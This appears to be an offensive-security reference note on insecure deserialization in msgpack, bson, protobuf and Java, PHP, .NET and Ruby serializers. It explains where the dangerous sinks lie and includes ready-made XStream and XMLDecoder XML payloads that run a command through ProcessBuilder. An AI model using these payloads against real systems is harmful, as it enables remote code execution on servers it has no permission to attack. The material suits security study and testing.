# Other Serialized Formats — the typed-data (non-RCE) + edge cases

## The split that matters

- **Code-execution formats** — pickle, Marshal, BinaryFormatter, PHP
  serialize, node-serialize, PyYAML/Snakeyaml/Psych typed tags,
  XStream/XMLDecoder. The parser itself builds callable objects.
- **Typed-data formats** — protobuf, thrift, avro, msgpack, bson, Ion,
  Cap'n Proto. The parser builds data structures; the bug is DOWNSTREAM in
  what the app does with a decoded field.

For the second family, the parser is never the bug — the app is. The
detection and exploitation still matter because these formats *carry* the
dangerous field to the sink.

## msgpack — the ext-type surface

```
0xC0 nil          0xC2/C3 bool       0xC4-C6 bin     0xC7-C9 ext
0xCA-CB float     0xCC-CF uint       0xD0-D3 int     0xD4-D8 fixext
0xD9-DB str       0xDC-DD array      0xDE-DF map     0xE0-FF negfixint
```

`tools/msgpack_read.py blob` decodes the frame and names the ext types.

The bug is `ext_hook` — `msgpack.unpackb(data, ext_hook=hook)`. If `hook`
calls a class constructor, `pickle.loads`, `eval`, or a registry lookup,
the ext payload reaches it:

```python
# app-side sink shape:
def ext_hook(code, data):
    return registry[code].from_bytes(data)   # your bytes into a constructor
unpackb(body, ext_hook=ext_hook)
```

## bson — MongoDB document

`bson` is a typed binary-JSON — carries ObjectIds, regexes, `$where` JS,
timestamps. The dangers are field-level:

- `$where` → `eval` in a query → NoSQL injection overlap
- `$regex` → ReDoS / filter bypass
- a field the app `eval`s or uses to build a query

`tools/forensics/bson_dump.py` decodes a document. The exploit is what the
app does with the decoded dict — not the parser.

## protobuf / gRPC — the typed-message surface

```
tag = (field_num << 3) | wire_type
wire 0 varint, 1 i64, 2 len-delimited, 5 i32
```

`tools/proto_decode.py blob` walks the wire format without a `.proto`.
The bug shapes:

- a `string`/`bytes` field the app `eval`s/`exec`s/`unserialize`s
- an `Any` message the app unmarshals into a trusted type
- a field that reaches a query/command/path

Protobuf itself has no gadget surface — the sink is downstream.

## Java alternate serializers

| Serializer | Container | Sink family |
|---|---|---|
| XStream | XML | `XStream.fromXML` — `<com.x.Class>` tags; CVE-2013-7285, 2017-9805, 2020-* families |
| XMLDecoder | XML | `<java><object class="javax.script...">` — bean instantiation |
| Hessian | binary | Hessian2 protocol — `C` sig — gadget via `toString`/equals |
| Kryo | binary | `readObject`-style — `Kryo.readClassAndObject` |
| Castor/JAXB | XML | typed XML beans — setter chains |
| Fastjson | JSON `@type` | `autoType` bypass per version |
| Jackson | JSON `@class`/default typing | polymorphic type gadgets |

### XStream — the most exploitable XML sink

```xml
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>id</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

`XStream.fromXML` instantiates any named class — `dynamic-proxy` +
`EventHandler` → `ProcessBuilder.start` is the classic. Version-gated
denylists exist per release — the CVE number picks the bypass.

### XMLDecoder — bean instantiation

```xml
<java version="1.8"><object class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array>
  <void method="start"/>
</object></java>
```

`XMLDecoder.readObject` runs `void method` calls on any bean — RCE by
design. Any code that does `new XMLDecoder(in).readObject()` is the sink.

## PHP alternate containers

- `igbinary` — the binary session serializer — same `O:`/`a:` grammar,
  different container. `unserialize` on igbinary data is NOT the same —
  but `igbinary_unserialize` is — both are sinks.
- `session.serialize_handler=php` (the OTHER handler, not `php_serialize`)
  uses a `name|value` format — session files look different.
- `wddx` — old XML serialization — `wddx_deserialize` on user input.
- `json_decode` + `unserialize` combo — a JSON field that carries a PHP
  serialize string inside (nested format).

## .NET alternate sinks

- `LosFormatter` / `ObjectStateFormatter` — ViewState family
- `NetDataContractSerializer` — `z:Type`/`z:Assembly` attrs — full type info
- `JavaScriptSerializer` with `SimpleTypeResolver` — `{"__type":"X"}`
- `DataContractJsonSerializer` — `$type`-ish
- `XmlSerializer` — setter-only, needs ObjectDataProvider-style proxy
- `YamlDotNet` `!<type>` — ObjectDataProvider

## Ruby alternate sinks

- `Oj.load`/`Oj.safe_load` with `:mode=>:object` — typed JSON revive
- `Psych` — covered in yaml-deser.md
- `Marshal` — covered in ruby-deser.md
- `ActiveSupport::MessageEncryptor`/`MessageVerifier` — signed Marshal blobs

## The rule for "typed data" formats

If the parser only builds data (protobuf/bson/msgpack/avro/thrift), the
deserialization bug is never IN the parser — trace the decoded value to the
sink: `eval`, `exec`, `unserialize`, `lookup`, a query builder, a path.
The format is the carrier; the downstream call is the exploit.
